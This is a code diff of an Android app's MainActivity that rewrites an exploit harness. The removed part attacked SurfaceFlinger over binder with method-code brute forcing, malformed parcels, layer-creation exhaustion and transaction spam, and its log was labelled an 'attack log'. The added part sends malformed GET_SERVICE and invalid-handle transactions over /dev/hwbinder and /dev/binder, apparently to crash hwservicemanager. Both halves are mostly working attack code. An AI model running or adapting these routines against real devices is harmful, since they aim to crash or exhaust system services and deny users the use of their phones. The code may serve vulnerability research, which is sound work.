@@ -55,11 +55,8 @@ public class MainActivity extends AppCompatActivity {
 
     public static native int nativeOpenDevice(String path);
     public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
-    public static native byte[] nativeBinderGetService(int fd, String serviceName, String descriptor);
     public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
-    public static native int nativeBinderWriteToService(int fd, int handle, int code, int flags, byte[] data);
-    public static native byte[] nativeBuildSurfaceFlingerParcel(int displayId, int layerId, int what, int x, int y, int w, int h);
-    public static native byte[] nativeBuildMalformedParcel(int size, int offsetCount);
+    public static native byte[] nativeBuildMalformedParcel(int type, int extra);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -169,57 +166,27 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== SURFACEFLINGER ATTACK VECTOR ==========");
+        appendLog("========== HWSERVICEMANAGER CRASH TEST ==========");
 
-        int fd = nativeOpenDevice("/dev/binder");
-        if (fd < 0) {
-            fd = nativeOpenDevice("/dev/hwbinder");
-        }
-        if (fd < 0) {
+        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
+        int binderFd = nativeOpenDevice("/dev/binder");
+
+        if (hwbinderFd < 0 && binderFd < 0) {
             appendLog("[!] No binder device");
             return;
         }
-        appendLog("[+] Using fd=" + fd);
 
-        appendLog("[*] Getting SurfaceFlinger handle...");
-        String[] names = {"SurfaceFlinger", "android.ui.ISurfaceComposer", "android.gui.ISurfaceComposer"};
-        int sfHandle = -1;
-        for (String name : names) {
-            byte[] reply = nativeBinderGetService(fd, name, "android.ui.ISurfaceComposer");
-            if (reply != null && reply.length >= 4) {
-                int h = ((reply[0] & 0xFF) | ((reply[1] & 0xFF) << 8) |
-                         ((reply[2] & 0xFF) << 16) | ((reply[3] & 0xFF) << 24));
-                if (h != 0) {
-                    sfHandle = h;
-                    appendLog("[GETSVC] " + name + " -> handle=" + h);
-                    dumpToFile(reply, "getsvc_sf_" + name + ".bin");
-                    break;
-                }
-            }
-        }
-        if (sfHandle < 0) {
-            appendLog("[!] SurfaceFlinger handle not found, assuming handle=0 (context manager)");
-            sfHandle = 0;
+        if (hwbinderFd >= 0) {
+            appendLog("[+] Testing /dev/hwbinder fd=" + hwbinderFd);
+            testHwServiceManagerCrash(hwbinderFd, "hwbinder");
+            try { ParcelFileDescriptor.adoptFd(hwbinderFd).close(); } catch (Exception e) {}
         }
 
-        appendLog("[*] Testing SurfaceFlinger with handle=" + sfHandle);
-        testSurfaceFlingerMethods(fd, sfHandle);
-
-        appendLog("[*] Testing malformed parcels on SurfaceFlinger");
-        testMalformedParcels(fd, sfHandle);
-
-        appendLog("[*] Testing resource exhaustion (layer creation spam)");
-        testResourceExhaustion(fd, sfHandle);
-
-        appendLog("[*] Testing invalid display/layer IDs");
-        testInvalidIds(fd, sfHandle);
-
-        appendLog("[*] Testing large transaction spam (DoS)");
-        testTransactionSpam(fd, sfHandle);
-
-        try {
-            ParcelFileDescriptor.adoptFd(fd).close();
-        } catch (Exception e) {}
+        if (binderFd >= 0) {
+            appendLog("[+] Testing /dev/binder fd=" + binderFd);
+            testHwServiceManagerCrash(binderFd, "binder");
+            try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
+        }
 
         appendLog("========== TEST COMPLETED ==========");
         appendLog("========================================");
@@ -230,138 +197,46 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    private void testSurfaceFlingerMethods(int fd, int handle) {
-        appendLog("[SF] Brute-forcing method codes 0-60");
+    private void testHwServiceManagerCrash(int fd, String devName) {
+        appendLog("[CRASH-" + devName + "] Sending malformed GET_SERVICE (handle=0, code=1)");
 
-        int[] codes = new int[61];
-        for (int i = 0; i <= 60; i++) codes[i] = i;
-
-        for (int code : codes) {
+        int[] malformedTypes = {0, 1, 2, 3, 4, 5, 6};
+        for (int type : malformedTypes) {
             if (stopRequested.get()) break;
-            String result = nativeBinderDumpReply(fd, handle, code, 0, null);
-            if (result.contains("len=")) {
-                appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
-                try { Thread.sleep(5); } catch (Exception e) {}
-            }
+            byte[] data = nativeBuildMalformedParcel(type, 0);
+            String result = nativeBinderDumpReply(fd, 0, 1, 0, data);
+            appendLog("[CRASH-" + devName + "] type=" + type + " -> " + result);
+            try { Thread.sleep(50); } catch (Exception e) {}
         }
 
-        appendLog("[SF] Trying codes 0x64-0x7F (100-127)");
-        for (int code = 0x64; code <= 0x7F; code++) {
-            if (stopRequested.get()) break;
-            String result = nativeBinderDumpReply(fd, handle, code, 0, null);
-            if (result.contains("len=")) {
-                appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
-                try { Thread.sleep(5); } catch (Exception e) {}
-            }
-        }
-    }
-
-    private void testMalformedParcels(int fd, int handle) {
-        appendLog("[SF-MALFORM] Sending malformed parcels");
-
-        int[] sizes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536};
-        for (int size : sizes) {
-            if (stopRequested.get()) break;
-            byte[] data = new byte[size];
-            for (int i = 0; i < data.length; i++) data[i] = (byte)(i & 0xFF);
-            String result = nativeBinderDumpReply(fd, handle, 4, 0, data);
-            appendLog("[SF-MALFORM] size=" + size + " -> " + result);
-            try { Thread.sleep(5); } catch (Exception e) {}
+        appendLog("[CRASH-" + devName + "] Sending GET_SERVICE with code=1 and flags=TF_ONE_WAY");
+        byte[] reply = nativeBinderTransaction(fd, 0, 1, 1, null);
+        if (reply == null) {
+            appendLog("[CRASH-" + devName + "] oneway -> no reply");
+        } else {
+            appendLog("[CRASH-" + devName + "] oneway -> len=" + reply.length);
         }
 
-        appendLog("[SF-MALFORM] Sending parcels with offsets (invalid)");
-        for (int offsetCount = 1; offsetCount <= 16; offsetCount++) {
-            if (stopRequested.get()) break;
-            byte[] data = nativeBuildMalformedParcel(128, offsetCount);
-            String result = nativeBinderDumpReply(fd, handle, 4, 0, data);
-            appendLog("[SF-MALFORM] offsetCount=" + offsetCount + " -> " + result);
-            try { Thread.sleep(10); } catch (Exception e) {}
+        appendLog("[CRASH-" + devName + "] Sending transaction with invalid handle (9999)");
+        reply = nativeBinderTransaction(fd, 9999, 1, 0, null);
+        if (reply == null) {
+            appendLog("[CRASH-" + devName + "] invalid handle -> no reply");
+        } else {
+            appendLog("[CRASH-" + devName + "] invalid handle -> len=" + reply.length);
         }
 
-        appendLog("[SF-MALFORM] Sending parcels with invalid binder objects");
-        byte[] objParcel = nativeBuildSurfaceFlingerParcel(0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0);
-        String result = nativeBinderDumpReply(fd, handle, 4, 0, objParcel);
-        appendLog("[SF-MALFORM] invalid display/layer -> " + result);
-
-        byte[] hugeObjParcel = nativeBuildSurfaceFlingerParcel(0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 1920, 1080);
-        result = nativeBinderDumpReply(fd, handle, 6, 0, hugeObjParcel);
-        appendLog("[SF-MALFORM] createLayer with invalid params -> " + result);
-    }
-
-    private void testResourceExhaustion(int fd, int handle) {
-        appendLog("[SF-DOS] Resource exhaustion: creating many layers");
-
-        for (int i = 0; i < 100; i++) {
-            if (stopRequested.get()) break;
-            byte[] data = nativeBuildSurfaceFlingerParcel(1, i + 1, 0, 0, 0, 100, 100);
-            String result = nativeBinderDumpReply(fd, handle, 6, 1, data);
-            if (i % 10 == 0) {
-                appendLog("[SF-DOS] Layer " + i + " -> " + result);
-            }
-            try { Thread.sleep(2); } catch (Exception e) {}
-        }
-
-        appendLog("[SF-DOS] Trying to destroy non-existent layers");
-        for (int i = 0; i < 50; i++) {
-            if (stopRequested.get()) break;
-            byte[] data = nativeBuildSurfaceFlingerParcel(1, i + 1000, 0, 0, 0, 0, 0);
-            String result = nativeBinderDumpReply(fd, handle, 7, 0, data);
-            if (i % 10 == 0) {
-                appendLog("[SF-DOS] Destroy layer " + (i + 1000) + " -> " + result);
-            }
-            try { Thread.sleep(2); } catch (Exception e) {}
-        }
-    }
-
-    private void testInvalidIds(int fd, int handle) {
-        appendLog("[SF-INVALID] Testing with invalid display IDs");
-
-        int[] displayIds = {0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0x7FFFFFFF, 0x80000000};
-        for (int id : displayIds) {
-            if (stopRequested.get()) break;
-            byte[] data = nativeBuildSurfaceFlingerParcel(id, 0, 0, 0, 0, 0, 0);
-            String result = nativeBinderDumpReply(fd, handle, 1, 0, data);
-            appendLog("[SF-INVALID] createDisplay id=0x" + Integer.toHexString(id) + " -> " + result);
-            try { Thread.sleep(5); } catch (Exception e) {}
-        }
-
-        appendLog("[SF-INVALID] Testing setPowerMode with invalid modes");
-        int[] modes = {0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0x7FFFFFFF};
-        for (int mode : modes) {
-            if (stopRequested.get()) break;
-            byte[] data = new byte[8];
-            data[0] = (byte)(mode & 0xFF);
-            data[1] = (byte)((mode >> 8) & 0xFF);
-            data[2] = (byte)((mode >> 16) & 0xFF);
-            data[3] = (byte)((mode >> 24) & 0xFF);
-            String result = nativeBinderDumpReply(fd, handle, 9, 0, data);
-            appendLog("[SF-INVALID] setPowerMode mode=" + mode + " -> " + result);
-            try { Thread.sleep(5); } catch (Exception e) {}
-        }
-    }
-
-    private void testTransactionSpam(int fd, int handle) {
-        appendLog("[SF-SPAM] Sending many transactions rapidly");
-
-        for (int i = 0; i < 200; i++) {
-            if (stopRequested.get()) break;
-            byte[] data = nativeBuildSurfaceFlingerParcel(1, i % 10, i % 10, i % 100, i % 100, 100, 100);
-            nativeBinderWriteToService(fd, handle, 4, 1, data);
-            if (i % 20 == 0) {
-                appendLog("[SF-SPAM] Sent " + (i + 1) + " transactions");
-            }
-            try { Thread.sleep(1); } catch (Exception e) {}
-        }
-
-        appendLog("[SF-SPAM] Sending empty transactions with oneway flag");
-        for (int i = 0; i < 100; i++) {
-            if (stopRequested.get()) break;
-            nativeBinderWriteToService(fd, handle, 0, 1, null);
-            if (i % 20 == 0) {
-                appendLog("[SF-SPAM] Sent " + (i + 1) + " empty oneway");
-            }
-            try { Thread.sleep(1); } catch (Exception e) {}
-        }
+        appendLog("[CRASH-" + devName + "] Sending BC_TRANSACTION with no data and invalid offsets");
+        byte[] offsetData = new byte[8];
+        offsetData[0] = 0x01;
+        offsetData[1] = 0x00;
+        offsetData[2] = 0x00;
+        offsetData[3] = 0x00;
+        offsetData[4] = 0x00;
+        offsetData[5] = 0x00;
+        offsetData[6] = 0x00;
+        offsetData[7] = 0x00;
+        String res = nativeBinderDumpReply(fd, 0, 1, 0, offsetData);
+        appendLog("[CRASH-" + devName + "] offset data -> " + res);
     }
 
     private void dumpToFile(byte[] data, String filename) {
@@ -402,9 +277,9 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = getDumpDir();
-            File file = new File(dir, "surfaceflinger_attack_log.txt");
+            File file = new File(dir, "hwservicemanager_crash_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== SurfaceFlinger Attack Log ===");
+                pw.println("=== HwServiceManager Crash Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
